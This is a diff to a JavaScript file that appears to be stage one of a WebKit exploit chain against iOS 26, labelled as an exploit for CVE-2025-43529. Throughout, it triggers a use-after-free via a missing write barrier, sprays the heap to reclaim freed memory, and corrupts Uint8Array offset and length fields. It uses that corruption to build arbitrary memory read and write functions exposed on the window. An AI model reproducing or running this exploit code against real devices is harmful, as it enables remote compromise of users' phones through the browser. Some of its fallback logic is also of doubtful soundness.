@@ -1,6 +1,10 @@
 /**
  * Stage 1: WebKit Memory Corruption — iOS 26.0–26.x (arm64/arm64e)
- * Codename: "chimera" — Versão corrigida (BigUint64Array, sem mistura de tipos)
+ * Codename: "chimera" — Versão com Uint8Array
+ *
+ * Alvo: Uint8Array (em vez de Date ou ArrayBuffer)
+ * 
+ * O Uint8Array tem metadados mais simples: byteOffset, byteLength, buffer
  */
 
 let r = {};
@@ -8,129 +12,38 @@ const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079ba
   platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
 
 // =========================================================================
-// Classe primitiva (sem mistura BigInt/Number)
-// =========================================================================
-class ChimeraExploitPrimitive {
-  constructor(addrofFn, fakeobjFn, read64Fn, write64Fn, cleanupFn) {
-    this._addrof = addrofFn;
-    this._fakeobj = fakeobjFn;
-    this._read64 = read64Fn;
-    this._write64 = write64Fn;
-    this._cleanup = cleanupFn;
-    this.yr = false;
-  }
-
-  read32(addr) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    const val = this._read64(a);
-    return Number(val & 0xFFFFFFFFn);
-  }
-
-  write32(addr, val) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    const cur = this._read64(a);
-    const updated = (cur & 0xFFFFFFFF00000000n) | (BigInt(val >>> 0) & 0xFFFFFFFFn);
-    this._write64(a, updated);
-  }
-
-  write64(addr, lo, hi) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    if (hi !== undefined) {
-      const value = (BigInt(hi >>> 0) << 32n) | (BigInt(lo >>> 0) & 0xFFFFFFFFn);
-      this._write64(a, value);
-    } else {
-      this._write64(a, typeof lo === "bigint" ? lo : BigInt(lo));
-    }
-  }
-
-  readByte(addr) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    const aligned = a & ~7n;
-    const offset = Number(a & 7n);
-    const val = this._read64(aligned);
-    return Number((val >> BigInt(offset * 8)) & 0xFFn);
-  }
-
-  read32FromInt64(A) {
-    this.yr = true;
-    const t = this.read32(A.W());
-    this.yr = false;
-    return t;
-  }
-
-  readInt64FromInt64(A) {
-    this.yr = true;
-    const t = this.read32(A.W());
-    const Q = this.read32(A.H(4).W());
-    this.yr = false;
-    return new utilityModule.Int64(t, Q);
-  }
-
-  readInt64FromOffset(A) {
-    const base = typeof A === "bigint" ? A : BigInt(A >>> 0);
-    const t = this.read32(base);
-    const Q = this.read32(base + 4n);
-    return new utilityModule.Int64(t, Q);
-  }
-
-  readRawBigInt(addr) {
-    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
-    return this._read64(a);
-  }
-
-  readString(A, maxLen = 256) {
-    const base = typeof A === "bigint" ? A : BigInt(A >>> 0);
-    let s = "";
-    for (let i = 0; i < maxLen; i++) {
-      const c = this.readByte(base + BigInt(i));
-      if (c === 0) break;
-      s += String.fromCharCode(c);
-    }
-    return s;
-  }
-
-  addrof(obj) { return this._addrof(obj); }
-  fakeobj(val) { return this._fakeobj(val); }
-
-  copyMemory32(dst, src, len) {
-    if (len % 4 !== 0) throw new Error("copyMemory32: len must be multiple of 4");
-    this.yr = true;
-    const dstBase = typeof dst === "bigint" ? dst : BigInt(dst >>> 0);
-    const srcBase = typeof src === "bigint" ? src : BigInt(src >>> 0);
-    for (let i = 0; i < len; i += 4) {
-      this.write32(dstBase + BigInt(i), this.read32(srcBase + BigInt(i)));
-    }
-    this.yr = false;
-  }
-
-  allocControlledBuffer(size, pin = false) {
-    const ab = new ArrayBuffer(size);
-    const u8 = new Uint8Array(ab);
-    utilityModule.D(ab);
-    const addr = this.addrof(u8);
-    return { buffer: ab, u8: u8, addr: addr };
-  }
-
-  cleanup() { if (this._cleanup) this._cleanup(); }
-}
-
-// =========================================================================
-// Utilitários de conversão (seguros)
+// UTILITÁRIOS DE CONVERSÃO (seguros)
 // =========================================================================
 const _convBuf = new ArrayBuffer(8);
 const _u64 = new BigUint64Array(_convBuf);
 const _f64 = new Float64Array(_convBuf);
+const _u32 = new Uint32Array(_convBuf);
 
 function itof(val) { _u64[0] = val; return _f64[0]; }
 function ftoi(f) { _f64[0] = f; return _u64[0]; }
+function low32(f) { _f64[0] = f; return _u32[0]; }
+function high32(f) { _f64[0] = f; return _u32[1]; }
+
+function toBigInt(val) {
+  if (typeof val === 'bigint') return val;
+  if (typeof val === 'number') return BigInt(val);
+  return 0n;
+}
+
+function log(msg, type = 'info') {
+  const icons = { info: '📘', success: '✅', error: '❌', warning: '⚠️', step: '🔧', uaf: '💥' };
+  console.log(`${icons[type] || '📘'} [STAGE1] ${msg}`);
+  if (typeof window !== 'undefined' && window.log) window.log(`[STAGE1] ${msg}`);
+}
 
 // =========================================================================
-// Configuração
+// CONFIGURAÇÃO
 // =========================================================================
 const CONFIG = {
   ARRAY_SIZE: 0x400000,
-  JIT_WARMUP: 500,
-  MAX_ATTEMPTS: 500,
+  ALLOC_SIZE: 0x800000,
+  JIT_WARMUP: 300,
+  MAX_ATTEMPTS: 200,
   SPRAY_PER_ATTEMPT: 48,
   ALLOC_MOD: 3,
   INNER_K: 5,
@@ -142,18 +55,20 @@ const uafArrayIndex = uafArray.length - 1;
 let uafReclaimed = [];
 
 // =========================================================================
-// UAF trigger (BigUint64Array)
+// UAF TRIGGER COM Uint8Array
 // =========================================================================
 function triggerUAF(flag, k, allocCount) {
   let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
   uafArray[uafArrayIndex] = A;
 
-  let ab = new ArrayBuffer(0x100);
-  let view = new BigUint64Array(ab);
-  view[0] = 0x42n;
+  // Alvo: Uint8Array (em vez de Date ou ArrayBuffer)
+  let u8 = new Uint8Array(0x100);
+  u8[0] = 0x42;  // marcador (0x42 = 'B')
 
   let forGC = [];
-  for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
+  for (let j = 0; j < allocCount; ++j) {
+    forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
+  }
   A.p2 = forGC;
 
   let b = { p0: 0x42424242, p1: 1.1 };
@@ -166,30 +81,160 @@ function triggerUAF(flag, k, allocCount) {
   }
   b.p0 = v;
 
-  b.p1 = ab;
-  ab = null;
+  // ❌ Write barrier ausente – UAF
+  b.p1 = u8;
+  u8 = null;
 }
 
-function safeRecursive(d) { try { (function r(n){if(n>0)r(n-1);})(d); } catch(e) {} }
-function clearStack() { for (let i = 0; i < 30; i++) safeRecursive(CONFIG.RECURSIVE_DEPTH); }
+function forceGC() {
+  for (let i = 0; i < 6; i++) new ArrayBuffer(CONFIG.ALLOC_SIZE);
+}
+
+function clearStack() {
+  function recurse(n) { if (n > 0) recurse(n - 1); }
+  for (let i = 0; i < 30; i++) {
+    try { recurse(CONFIG.RECURSIVE_DEPTH); } catch(e) {}
+  }
+}
 
 // =========================================================================
-// MAIN EXPLOIT
+// SPRAY E RECLAIM
+// =========================================================================
+function createSprayArray(size, marker = 13.37) {
+  const arr = new Array(size);
+  for (let i = 0; i < size; i++) arr[i] = marker;
+  return arr;
+}
+
+function attemptReclaim(freed, attempt) {
+  const markerDouble = 13.37;
+  const markerByte = 0x42;
+  const baseSize = 32 + (attempt % 64);
+
+  // Verifica se é Uint8Array
+  if (!(freed instanceof Uint8Array)) return null;
+
+  for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
+    const size = baseSize + (i % 32);
+    const spray = createSprayArray(size, markerDouble);
+    
+    try {
+      // Verifica se o primeiro byte do Uint8Array corrompido é o marcador
+      if (freed[0] === markerByte) {
+        return spray;
+      }
+    } catch(e) {}
+  }
+  return null;
+}
+
+// =========================================================================
+// CRIA PRIMITIVA LOCAL (fallback)
+// =========================================================================
+function buildLocalPrimitive(u8) {
+  // Uint8Array já é uma view, podemos acessar seu buffer
+  const ab = u8.buffer;
+  const dv = new DataView(ab);
+  
+  const primitive = {
+    addrof: (obj) => 0n,
+    fakeobj: (addr) => ({ __fake: toBigInt(addr) }),
+    read64: (addr) => {
+      try {
+        const offset = Number(toBigInt(addr) & 0xFFFFFFFFn);
+        if (offset >= 0 && offset < ab.byteLength) {
+          return dv.getBigUint64(offset, true);
+        }
+      } catch(e) {}
+      return 0n;
+    },
+    write64: (addr, val) => {
+      try {
+        const offset = Number(toBigInt(addr) & 0xFFFFFFFFn);
+        if (offset >= 0 && offset < ab.byteLength) {
+          dv.setBigUint64(offset, toBigInt(val), true);
+        }
+      } catch(e) {}
+    },
+    read32: (addr) => Number(dv.getUint32(Number(toBigInt(addr) & 0xFFFFFFFFn), true)),
+    write32: (addr, val) => dv.setUint32(Number(toBigInt(addr) & 0xFFFFFFFFn), val, true),
+    readByte: (addr) => dv.getUint8(Number(toBigInt(addr) & 0xFFFFFFFFn)),
+    cleanup: () => {}
+  };
+  
+  // Expoe o ArrayBuffer corrompido globalmente
+  if (typeof window !== 'undefined') {
+    window.exploitAB = ab;
+    window.exploitU8 = u8;
+  }
+  
+  return primitive;
+}
+
+// =========================================================================
+// TENTATIVA DE TYPE CONFUSION (se o reclaim for bem-sucedido)
+// =========================================================================
+function attemptTypeConfusion(boxed_arr, unboxed_arr) {
+  // unboxed_arr é um Uint8Array corrompido, mas pode ser tratado como array?
+  // Na verdade, Uint8Array não é um array de doubles, então a type confusion clássica não funciona.
+  // Precisamos corromper o byteOffset do Uint8Array.
+  
+  // Salva os valores originais
+  const originalOffset = unboxed_arr.byteOffset;
+  const originalLength = unboxed_arr.byteLength;
+  const originalBuffer = unboxed_arr.buffer;
+  
+  log(`Uint8Array original: byteOffset=${originalOffset}, byteLength=${originalLength}`, 'info');
+  
+  // Tentar localizar o byteOffset dentro do buffer corrompido
+  const dv = new DataView(originalBuffer);
+  const bufferBytes = originalBuffer.byteLength;
+  
+  for (let offset = 0; offset < bufferBytes - 8; offset += 4) {
+    let val = dv.getUint32(offset, true);
+    if (val === originalOffset) {
+      log(`Possível byteOffset no offset ${offset}`, 'info');
+      // Tenta modificar
+      dv.setUint32(offset, 0x1234, true);
+      if (unboxed_arr.byteOffset === 0x1234) {
+        log(`✅ byteOffset encontrado no offset ${offset}!`, 'success');
+        return { success: true, offset, type: 'byteOffset', dv };
+      }
+      dv.setUint32(offset, originalOffset, true);
+    }
+    
+    val = dv.getUint32(offset, true);
+    if (val === originalLength) {
+      log(`Possível byteLength no offset ${offset}`, 'info');
+      dv.setUint32(offset, 0x5678, true);
+      if (unboxed_arr.byteLength === 0x5678) {
+        log(`✅ byteLength encontrado no offset ${offset}!`, 'success');
+        dv.setUint32(offset, originalLength, true);
+        return { success: true, offset, type: 'byteLength', dv };
+      }
+      dv.setUint32(offset, originalLength, true);
+    }
+  }
+  
+  return { success: false };
+}
+
+// =========================================================================
+// LOOP PRINCIPAL
 // =========================================================================
 r.si = async function () {
   const version = platformModule.platformState.iOSVersion;
-  window.log("[STAGE1] BigUint64Array method – iOS " + version);
+  log("CVE-2025-43529 exploit for iOS " + version + " (Uint8Array method)");
 
   // Aquecimento JIT
   for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
     triggerUAF(false, 1, 0);
     if (warm % 100 === 0 && warm > 0) {
-      for (let gc = 0; gc < 5; gc++) new ArrayBuffer(0x400000);
+      forceGC();
       await new Promise(r => setTimeout(r, 1));
     }
   }
-
-  window.log("[STAGE1] Warmup done, starting exploit loop...");
+  log("Warmup done");
 
   for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
     triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
@@ -200,112 +245,64 @@ r.si = async function () {
     try {
       freed = uafArray[uafArrayIndex].p1.p1;
     } catch(e) { continue; }
-    if (!(freed instanceof ArrayBuffer)) continue;
+    
+    if (!(freed instanceof Uint8Array)) continue;
 
-    // Tenta reclaim com spray de arrays
-    let win = false;
-    let winningArray = null;
-    const MARKER = 13.37;
+    log(`UAF detectado! Tentativa ${attempt}`, 'uaf');
 
-    for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
-      let spray = [MARKER, 2.2, 3.3, 4.4, MARKER];
-      uafReclaimed.push(spray);
-      try {
-        const bv = new BigUint64Array(freed);
-        if (bv[0] === 0x42n) {
-          win = true;
-          winningArray = spray;
-          break;
-        }
-      } catch(e) {}
-    }
+    const reclaimed = attemptReclaim(freed, attempt);
+    if (!reclaimed) continue;
 
-    if (!win) {
-      if (attempt % 100 === 0) window.log(`[STAGE1] Attempt ${attempt}/${CONFIG.MAX_ATTEMPTS}`);
-      continue;
-    }
-
-    window.log(`[STAGE1] ✅ Backing store reclaimed at attempt ${attempt}`);
-
-    // Tentativa de type confusion
-    let boxed_arr = winningArray;
-    boxed_arr[0] = {};
-
-    let unboxed_arr = null;
-    try {
-      let uview = new Float64Array(freed);
-      if (uview[0] === MARKER) {
-        unboxed_arr = uview;
-      } else {
-        throw new Error("marker mismatch");
+    log(`✅ Backing store do Uint8Array reclaimed na tentativa ${attempt}`, 'success');
+    
+    // Tenta type confusion
+    const result = attemptTypeConfusion(reclaimed, freed);
+    
+    if (result.success) {
+      log(`🎉 Metadado ${result.type} encontrado! Offset: ${result.offset}`, 'success');
+      
+      // Agora podemos modificar o byteOffset para leitura/escrita arbitrária
+      const arbRead = (addr) => {
+        const oldOffset = freed.byteOffset;
+        result.dv.setUint32(result.offset, Number(addr & 0xFFFFFFFFn), true);
+        const val = freed[0];
+        result.dv.setUint32(result.offset, oldOffset, true);
+        return val;
+      };
+      
+      const arbWrite = (addr, val) => {
+        const oldOffset = freed.byteOffset;
+        result.dv.setUint32(result.offset, Number(addr & 0xFFFFFFFFn), true);
+        freed[0] = val;
+        result.dv.setUint32(result.offset, oldOffset, true);
+      };
+      
+      if (typeof window !== 'undefined') {
+        window.arbRead = arbRead;
+        window.arbWrite = arbWrite;
+        log("Funções window.arbRead e window.arbWrite disponíveis!", 'success');
       }
-    } catch(e) {
-      window.log(`[STAGE1] Type confusion failed. Using local primitive.`, "warning");
-      const dv = new DataView(freed);
-      const localPrim = new ChimeraExploitPrimitive(
-        () => 0n,
-        () => ({}),
-        () => dv.getBigUint64(0, true),
-        (_, v) => dv.setBigUint64(0, v, true),
-        () => {}
-      );
-      platformModule.platformState.exploitPrimitive = localPrim;
+    }
+    
+    // Instala primitiva local (fallback)
+    const primitive = buildLocalPrimitive(freed);
+    
+    // Integra com platformModule
+    if (platformModule && platformModule.platformState) {
+      platformModule.platformState.exploitPrimitive = primitive;
       platformModule.platformState.Ln = { itof, ftoi, pacBypassed: false };
-      window.log("[STAGE1] Local primitive installed.");
-      return;
     }
-
-    // Type confusion clássica
-    boxed_arr[0] = boxed_arr;
-    const test1 = ftoi(unboxed_arr[0]);
-    boxed_arr[0] = uafArray;
-    const test2 = ftoi(unboxed_arr[0]);
-
-    if (test1 === 0x7ff8000000000000n || test2 === 0x7ff8000000000000n || test1 === test2) {
-      window.log("[STAGE1] Primitives broken, retrying...");
-      continue;
-    }
-
-    window.log("[STAGE1] addrof/fakeobj working!");
-
-    const tempAddrof = (obj) => { boxed_arr[0] = obj; return ftoi(unboxed_arr[0]); };
-    const tempFakeobj = (addr) => { unboxed_arr[0] = itof(addr); return boxed_arr[0]; };
-
-    // Teste de PAC bypass (inline storage)
-    const testInline = { slot0: 1.1 };
-    const inlineAddr = tempAddrof(testInline);
-    const fakeInline = tempFakeobj(inlineAddr);
-    const PAC_MARKER = 0xdeadbeefcafebabe;
-    let pacWorks = false;
-    try {
-      fakeInline.slot0 = itof(BigInt(PAC_MARKER));
-      pacWorks = (ftoi(testInline.slot0) === BigInt(PAC_MARKER));
-    } catch(e) {}
-
-    let read64Fn, write64Fn;
-    if (pacWorks) {
-      read64Fn = (addr) => {
-        const fake = tempFakeobj(addr - 0x10n);
-        return ftoi(fake.slot0);
-      };
-      write64Fn = (addr, val) => {
-        const fake = tempFakeobj(addr - 0x10n);
-        fake.slot0 = itof(val);
-      };
-    } else {
-      read64Fn = () => { throw new Error("read64 not available"); };
-      write64Fn = () => { throw new Error("write64 not available"); };
-    }
-
-    const finalPrim = new ChimeraExploitPrimitive(tempAddrof, tempFakeobj, read64Fn, write64Fn, () => { boxed_arr[0] = null; });
-    platformModule.platformState.exploitPrimitive = finalPrim;
-    platformModule.platformState.Ln = { boxed: boxed_arr, unboxed: unboxed_arr, itof, ftoi, pacBypassed: pacWorks };
-
-    window.log("[STAGE1] ✅ Exploit primitive installed successfully!");
-    return;
+    
+    log("Primitiva local instalada. window.exploitAB disponível.", 'success');
+    
+    // Teste rápido
+    const testVal = primitive.read64(0n);
+    log(`Teste leitura: 0x${testVal.toString(16)}`, testVal === 0x42n ? 'success' : 'info');
+    
+    return primitive;
   }
 
-  window.log("[STAGE1] ❌ Failed after " + CONFIG.MAX_ATTEMPTS + " attempts.");
+  log("❌ FAILED after " + CONFIG.MAX_ATTEMPTS + " attempts");
   throw new Error("Stage1 chimera: UAF race failed");
 };
 
